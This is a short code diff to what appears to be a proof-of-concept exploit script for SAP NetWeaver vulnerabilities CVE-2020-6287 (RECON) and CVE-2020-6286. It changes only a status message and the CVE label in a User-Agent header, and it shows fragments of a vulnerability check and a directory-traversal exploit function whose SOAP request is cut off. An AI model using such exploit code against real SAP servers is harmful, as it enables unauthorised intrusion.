@@ -54,7 +54,7 @@ def detect_vuln(base_url):
                 is_vulnerable = True
 
         if is_vulnerable:
-            status = 'Vulnerable!'
+            status = 'Vulnerable! [CVE-2020-6287] (RECON)'
             print ("%s - %s - %s" %(check['name'], status, base_url + check['path'] ))
             return {"status":True, "url":base_url + check['path']}
 
@@ -66,7 +66,7 @@ def detect_vuln(base_url):
 
 def exploit_traversal(url, zipfile):
     headers = {
-        "User-Agent": "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:43.0) Gecko/20100101 Firefox/43.0 CVE-2020-6287 PoC",
+        "User-Agent": "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:43.0) Gecko/20100101 Firefox/43.0 CVE-2020-6286 PoC",
         "Content-Type":"text/xml;charset=UTF-8"}
     xml = '''
     <soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:urn="urn:CTCWebServiceSi">
